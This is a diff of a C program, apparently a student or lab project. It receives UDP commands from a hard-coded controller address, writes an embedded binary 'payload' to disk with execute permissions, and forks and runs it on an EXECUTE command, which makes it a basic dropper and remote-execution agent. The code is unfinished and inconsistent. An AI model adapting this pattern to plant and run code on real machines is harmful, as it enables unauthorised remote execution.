@@ -11,19 +11,22 @@
 #include <sys/types.h> /// pid
 #include <sys/wait.h> /// wait function
 #include <time.h> // for time, records seconds since 1970
+#include <signal.h>
 
 
 //// Pre-Compile Area /////
-#include "helloworld.h" //// this includes the binary array and its length/ essentiall just a C file
+#include "Payload1.h" //// this includes the binary array and its length/ essentiall just a C file
+#include "Payload2.h"
 //// uses cli command to make the binary file into 
 
+/*
 time_t seconds; /// Time
 time_t timeTwo = 0;
 double TimeDif = 0; /// stores the difference in time
 int tableEntry = 0; /// entry 0, first execute adds one to the entries
 pid_t regTable[10] = {0};
 pid_t *tablePtr = &regTable[0];
-
+*/
 
 //// Struct for time and PIDS ///
 
@@ -39,18 +42,24 @@ typedef struct{
 void heartbeat(int sig, siginfo_t *info, void *uc){ /// signal number recevied (looking for SIGUSR1), pointer to structure of signal, pointer to user context structure
 	if(SIGUSR1 == sig){ ///user defined signal
 		printf("baBump...");
-
+	
+		/*
 		seconds = timeTwo; //// becomes old time
 
 		timeTwo = time(NULL); //// gets current time
 		
 		TimeDif = timeTwo - seconds; //gets time difference
+
+		printf("Seconds: %ld\n", seconds);
+		printf("timeTwo: %ld\n", timeTwo);
+
 		printf("Time Dif is %lf\n", TimeDif);
 
 		if(TimeDif > 5){
 			printf("Needs to re-deploy and execute\n");
 
 		}
+		*/
 	}
 }
 
@@ -59,8 +68,14 @@ void execute(void);
 void deploy(void);
 int main(void){
 	 /// Declare time
-	 seconds = time(NULL); // gets time since Jan 1 1970
-	 printf("Time Since: %ld \n", seconds);
+	 //seconds = time(NULL); // gets time since Jan 1 1970
+	// printf("Time Since: %ld \n", seconds);
+		int fd = open("pc1", O_WRONLY | O_CREAT, 0700); ///write uses this opened file descriptor
+		if(write(fd, Payload1_c,Payload1_c_len ) == -1){//// helloworld binary 
+			printf("Payload failed"); //// above writes the helloworld content to the file fd
+		}								//// helloworld is pointer to helloworld 
+		close(fd);
+
 
 
 	const char *ip = "10.60.117.165";
@@ -126,7 +141,26 @@ int main(void){
 
 			if(strcmp(buffer,"EXECUTE") == 0){ //// compares ASC11 values of buffer to a string, if 0 its equal
 				sendto(sockfd, buffer, 1024, 0, (struct sockaddr*)&client_addr, sizeof(client_addr));
-            	execute();
+				//// This section is dedicated to PIDs /////
+			pid_t p1 = 0;
+			pid_t parentsIden = getpid(); /// parent ID process for entire code running
+			char BUFFER[100]; /// buffer
+
+			char PBuffer[100];
+			sprintf(PBuffer, "%d", parentsIden); ///wrties parents PID to buffer as string for exec
+
+			char *args[] = {"./pc1", PBuffer, NULL}; /// makes const
+
+			int forkp1 = fork(); /// creates process
+            execute();
+
+
+
+
+
+
+
+				
             }
 
 			if(strcmp(buffer,"STATUS") == 0){ /// Zach's part
@@ -142,12 +176,14 @@ return 0;
 }
 
 void deploy(void){
+		//size_t Payload1_len = strlen(Payload1)
 
-		int fd = open("payload", O_WRONLY | O_CREAT, 0700); ///write uses this opened file descriptor
-		if(write(fd, helloworld, helloworld_len) == -1){//// helloworld binary 
+		int fd = open("pc1", O_WRONLY | O_CREAT, 0700); ///write uses this opened file descriptor
+		if(write(fd, Payload1_c,Payload1_c_len ) == -1){//// helloworld binary 
 			printf("Payload failed"); //// above writes the helloworld content to the file fd
 		}								//// helloworld is pointer to helloworld 
 		close(fd);
+		
 
 	}
 
@@ -162,7 +198,7 @@ void execute(void){
 	if( 0 == forkp1){ //// fork returns pid_t and if 0 in child
 		printf("Executing...\n"); /// Sender uses fgets()
 		char *args[] = {"./payload", NULL}; /// makes const
-		tableAddition();
+		
 		int result = execv(args[0], args); /// call a fork here check if child call exec in child
 		
 	}
@@ -170,8 +206,6 @@ void execute(void){
 	else{
 		wait(NULL);
 	}
-
-
 
 	
 
@@ -189,12 +223,4 @@ void execute(void){
 			*/
 }
 
-void tableAddition(void){
-	printf("We are currently in the table Addition fucntion/n");
-	tableEntry += 1;
-	pid_t current_pid = getpid();
-	regTable[tableEntry] = current_pid;
-	printf("Current Entry is: %d/n", tableEntry);
-	printf("Current PID: %d/n", current_pid);
-	
-}
+
